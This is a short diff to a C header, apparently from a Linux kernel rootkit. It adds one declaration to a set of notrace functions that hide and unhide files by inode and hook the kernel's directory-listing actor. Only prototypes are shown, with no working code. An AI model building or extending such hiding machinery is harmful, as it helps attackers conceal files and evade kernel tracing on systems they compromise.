@@ -14,4 +14,5 @@ extern filldir_t orig_actor;
 notrace void hide_file_inode(unsigned long ino);
 notrace int should_hide_inode(unsigned long ino);
 notrace void show_file_inode(const void __user *user_info);
+notrace void do_show_file_inode(unsigned long ino, int pid);
 notrace int filldir_actor(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
